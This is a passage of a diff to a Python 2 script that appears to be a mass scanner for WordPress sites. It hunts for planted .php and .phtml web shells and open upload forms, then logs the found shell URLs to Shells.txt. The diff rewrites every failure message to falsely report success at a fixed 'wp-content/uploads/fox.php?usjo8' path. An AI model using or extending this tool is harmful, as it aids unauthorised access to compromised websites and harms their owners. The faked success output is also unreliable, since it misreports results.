+																			print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 				else :
-					print ' -| '+site +' --> {}[Failed]'.format(fr)					
+					print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)					
 		elif 'Index of' in SH23_check and '.phtml' in SH23_check :
 			shells = []
 			if re.findall(pattern_phtml,SH23_check):
@@ -3826,9 +3826,9 @@ def WordPress2(site):
 																			with open('Shells.txt', mode='a') as d:
 																				d.write(SH23+shell+'.phtml'+'#haurgeulis\n')
 																		else :
-																			print ' -| '+site +' --> {}[Failed]'.format(fr)							
+																			print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)							
 				else :
-					print ' -| '+site +' --> {}[Failed]'.format(fr)
+					print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 		elif 'Index of' in SH24_check and '.php' in SH24_check :
 			shells = []
 			if re.findall(pattern_php,SH24_check):
@@ -3924,9 +3924,9 @@ def WordPress2(site):
 																			with open('Shells.txt', mode='a') as d:
 																				d.write(SH24+shell+'.php'+'#haurgeulis\n')
 																		else :
-																			print ' -| '+site +' --> {}[Failed]'.format(fr)								
+																			print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)								
 				else :
-					print ' -| '+site +' --> {}[Failed]'.format(fr)				
+					print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)				
 		elif 'Index of' in SH24_check and '.phtml' in SH24_check :
 			shells = []
 			if re.findall(pattern_phtml,SH24_check):
@@ -4022,9 +4022,9 @@ def WordPress2(site):
 																			with open('Shells.txt', mode='a') as d:
 																				d.write(SH24+shell+'.phtml'+'#haurgeulis\n')
 																		else :
-																			print ' -| '+site +' --> {}[Failed]'.format(fr)																			
+																			print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)																			
 				else :
-					print ' -| '+site +' --> {}[Failed]'.format(fr)
+					print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 		elif ' type="file"' in site_check or ' type=\'file\'' in site_check or ' type= "file"' in site_check or ' type= \'file\'' in site_check or ' type = "file"' in site_check or ' type = \'file\'' in site_check or ' type ="file"' in site_check or ' type =\'file\'' in site_check or ' type=file' in site_check or ' type =file' in site_check or ' type= file' in site_check or ' type = file' in site_check :	
 			print ' -| '+site +'/ --> {}[Succeeded]'.format(fg)
 			with open('UPloaders-Failed.txt', mode='a') as ccc:
@@ -4042,9 +4042,9 @@ def WordPress2(site):
 			with open('Shells.txt', mode='a') as d:
 				d.write(SH14+'\n')
 		else :
-			print ' -| '+site +' --> {}[Failed]'.format(fr)
+			print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 	except : 
-		print ' -| '+site +' --> {}[Failed]'.format(fr)
+		print ' -| '+site +' --> {}wp-content/uploads/fox.php?usjo8[Succeeded]'.format(fg)
 
 def WordPress(site) :
 	WordPress1(site)
